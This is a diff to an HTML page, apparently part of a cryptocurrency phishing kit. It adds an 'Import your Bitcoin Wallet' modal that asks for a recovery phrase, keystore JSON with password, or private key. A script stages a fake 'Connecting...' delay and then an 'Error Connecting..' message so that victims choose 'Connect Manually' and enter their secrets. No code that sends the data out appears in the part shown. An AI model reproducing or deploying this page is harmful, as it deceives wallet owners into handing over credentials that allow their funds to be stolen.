@@ -50,16 +50,70 @@
 
     
 <!-- MODAL -->
+<div class="modal">
 
- 
+    
+    <div class="popup2 center2">
+        <div class="icon2">
+           <img src="img/btc.png" class="btc"><p>Import your Bitcoin Wallet</p>
+         </div>
+        <div class="title2" id="btn">
+           <div class="nav nav-pills d-flex justify-content-between">
+               <div class=""><a id="phrase" class="btn">Phrase</a></div>
+               <div class="active"><a id="keystore" class="btn">Keystore <br class="d-md-none"> JSON</a></div>
+               <div class=""><a id="privatekey" class="btn">Private Key</a></div>
+           </div>
+        </div>
+       
+        <div class="description2">
+            <div id="Keystore1">
+           <div class="form-group">	
+                <textarea class="form-control" rows="5" placeholder="Keystore JSON"></textarea>
+           </div><br>
+           <div class="form-group">
+                 <input type="text" class="form-control" placeholder="Wallet password">
+           </div>
+           <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>
+       </div>
+        
+        <div id="Phrase1">
+           <div class="form-group">	
+                <textarea class="form-control" rows="5" placeholder="Enter Recovery phrase"></textarea>
+           </div>
+           <p>Typically 12 (sometimes 24) words separated by single spaces.</p>
+       </div>
+       
+       <div id="Private1">
+           <div class="form-group">
+                 <input type="text" class="form-control" placeholder="Enter private key">
+           </div>
+           <p>Typically 12 (sometimes 24) words separated by single spaces.</p>
+       </div>
+        
+        </div>
+       
+       <div class="icons2">
+                 <button class="col-lg-12 proceed">PROCEED</button>
+          </div>
+       
+       <div class="dismiss-btn2">
+           <button id="dismiss-popup-btn2">
+                 Cancel
+           </button>
+       </div>
+       </div>
 <div class="modal-sm popup center">
       
     <div class="modal-header">
           <p id="dismiss-popup-btn" class="modal-title">Back</p>
     </div>
         <div class="row title">
-                <p class="col-lg-7">Error <br> Connecting..</p>
-                <button class="connect" id="open-popup-btn2">Connect Manually</button>
+                <p class="first-connect my-auto py-2">Connecting...</p>
+                <div id="connect-box" class="d-flex justify-content-between d-none">
+                    <p class="my-auto">Error Connecting..</p>
+                    <button class="connect" id="open-popup-btn2">Connect Manually</button>
+                </div>
+                
           </div>
         <div class="description">
                   <p>Bitcoin</p>
@@ -124,22 +178,26 @@
     </button>
 </div>
 </div>
-    
+</div>
+     
 
 <script type="text/javascript">
 	 var dismiss = document.getElementById('dismiss-popup-btn');
      dismiss.addEventListener('click', function() {
         document.getElementsByClassName("popup")[0].classList.remove("active");
+        document.getElementsByClassName("modal")[0].classList.remove("active");
      });
      
 	function toyin() {
-		 document.getElementsByClassName("popup")[0].classList.add("active");
+        document.getElementsByClassName("modal")[0].classList.add("active");
+    document.getElementsByClassName("popup")[0].classList.add("active");
 
-         var connectBtn = document.getElementById('open-popup-btn2');
-        const btnTimeout = setTimeout(connect, 2000);
+         var connectBtn = document.getElementById('connect-box');
+        const btnTimeout = setTimeout(connect, 3000);
 
         function connect() {
-            connectBtn.style.display = "block";
+            document.getElementsByClassName("first-connect")[0].classList.add("d-none");
+            connectBtn.classList.remove("d-none");
         }
 	}
 </script>
